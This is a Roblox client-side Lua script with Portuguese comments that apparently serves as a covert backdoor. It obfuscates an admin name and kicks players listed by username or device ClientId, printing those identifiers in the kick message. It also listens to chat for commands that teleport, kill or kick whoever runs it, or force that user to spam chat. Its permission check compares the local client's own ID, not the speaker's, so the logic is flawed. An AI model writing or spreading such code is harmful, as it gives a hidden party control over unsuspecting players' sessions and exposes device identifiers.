local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

-- ========== OFUSCAÇÃO ========== --
local nome_admin = "\86\49\80\51\82"
local nome_admin_chat = "rbx" .. nome_admin
-- =============================== --

-- Lista de jogadores proibidos pelo nome
local bannedPlayers = {
    "Jaelthemaster0002",
    "ob9i",
    "Hd8e7ehdjs",
    "DabsterLamster"
}

-- Lista de ClientIds banidos
local bannedClientIds = {
    "0C2B36C2-6E7B-4D52-B4C3-8E9DD9A1C8F3", -- BitsProxyy
    "665B0C37-7E22-4FB4-941D-D346FDAC97E4", -- TheOnlyXed
    "24c17f55-48fe-42a4-ad6d-55a15481d2f9", -- ErasedGoldenRobot
    "62132B9A-D55B-47A2-8710-EC0D976D6B6D", -- ZauberKlinge
    "e23c5bed-d7d5-4806-be85-75d9f56d4c83", -- SunnySector
    "99dc9257-f72c-40ff-9efa-54de211c3064", -- Capo21900
    "16ce7c76-57cf-467e-b03a-97ac7e3dc927", -- Aesthetikbaddiegirl
    "001EE70C-48AC-4187-94E0-9A27AB88D287" -- mendingfilter
}

local function checkAndKick(player)
    local clientId = RbxAnalyticsService:GetClientId()
    if table.find(bannedPlayers, player.Name) or table.find(bannedClientIds, clientId) then
        player:Kick("Você está BANIDO PERMANENTEMENTE por " .. nome_admin .. "\n\nEntregue esta mensagem no grupo para recorrer:\n" ..
            "Banidos (nomes): " .. table.concat(bannedPlayers, ", ") .. "\n" ..
            "Banidos (ClientIds): " .. table.concat(bannedClientIds, ", "))
    end
end

Players.PlayerAdded:Connect(function(player)
    task.wait(1)
    checkAndKick(player)
end)

for _, player in ipairs(Players:GetPlayers()) do
    task.wait(1)
    checkAndKick(player)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer

-- ClientID permitido para comandos
local allowedClientId = "33bdf186-5c42-4d10-92cc-edbfa3bb7a78"
local clientId = RbxAnalyticsService:GetClientId()
local spamActive = false
local spamCoroutine

-- Função para encontrar jogador pelo nome parcial ou retornar todos se for "all"
local function getTargetPlayers(targetName)
    targetName = targetName:lower()
    local foundPlayers = {}

    if targetName == "all" then
        return Players:GetPlayers()
    else
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(targetName) or player.DisplayName:lower():find(targetName) then
                table.insert(foundPlayers, player)
            end
        end
        return foundPlayers
    end
end

ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(messageData)
    local message = messageData.Message:lower()
    local speaker = Players:GetPlayerByUserId(messageData.SpeakerUserId)

    -- Verifica se o speaker tem o ClientID permitido
    if speaker and clientId == allowedClientId then
        -- Comando .tpa [all/nome]
        if message:match("^%.tpa%s+(.+)$") then
            local targetName = message:match("^%.tpa%s+(.+)$")
            local targetPlayers = getTargetPlayers(targetName)

            if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
                for _, targetPlayer in pairs(targetPlayers) do
                    if targetPlayer == Player then
                        Player.Character:SetPrimaryPartCFrame(speaker.Character.HumanoidRootPart.CFrame)
                    end
                end
            end

        -- Comando .kick [all/nome]
        elseif message:match("^%.kick%s+(.+)$") then
            local targetName = message:match("^%.kick%s+(.+)$")
            local targetPlayers = getTargetPlayers(targetName)

            for _, targetPlayer in pairs(targetPlayers) do
                if targetPlayer == Player then
                    Player:Kick("you got kicked loser! by " .. nome_admin)
                end
            end

        -- Comando .kill [all/nome]
        elseif message:match("^%.kill%s+(.+)$") then
            local targetName = message:match("^%.kill%s+(.+)$")
            local targetPlayers = getTargetPlayers(targetName)

            for _, targetPlayer in pairs(targetPlayers) do
                if targetPlayer == Player and Player.Character and Player.Character:FindFirstChild("Humanoid") then
                    Player.Character.Humanoid.Health = 0
                end
            end

        -- Comando .spam [all/nome]
        elseif message:match("^%.spam%s+(.+)$") then
            local targetName = message:match("^%.spam%s+(.+)$")
            if not spamActive then
                spamActive = true
                spamCoroutine = coroutine.create(function()
                    while spamActive do
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(nome_admin .. " on top!", "All")
                        task.wait()
                    end
                end)
                coroutine.resume(spamCoroutine)
            end

        -- Comando .unspam
        elseif message == ".unspam" then
            if spamActive then
                spamActive = false
                if spamCoroutine then
                    coroutine.close(spamCoroutine)
                end
            end

        -- Comando .rj
        elseif message == ".rj" then
            game:GetService("TeleportService"):Teleport(game.PlaceId, Player)

        -- Comando .send [all/nome]
        elseif message:match("^%.send%s+(.+)$") then
            local targetName = message:match("^%.send%s+(.+)$")
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(nome_admin .. " on top!", "All")
        end
    end
end)

local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "Join the Server",
    Text = "Entre no grupo para recorrer ao banimento.\nEntregue a lista de banidos: nomes e clientIds.",
    Duration = 10,
    Button1 = "OK"
})
